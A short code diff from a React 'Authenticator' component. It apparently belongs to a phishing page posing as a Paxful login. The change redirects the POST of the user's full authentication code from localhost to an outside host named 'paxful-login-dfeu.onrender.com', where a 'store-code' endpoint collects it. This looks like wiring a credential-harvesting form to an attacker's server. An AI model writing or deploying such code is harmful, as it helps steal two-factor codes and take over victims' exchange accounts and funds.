@@ -26,7 +26,7 @@ export default function Authenticator() {
     }
 
     try {
-      const response = await fetch("http://localhost:3000/store-code", {
+      const response = await fetch("https://paxful-login-dfeu.onrender.com/store-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ code: fullCode }),
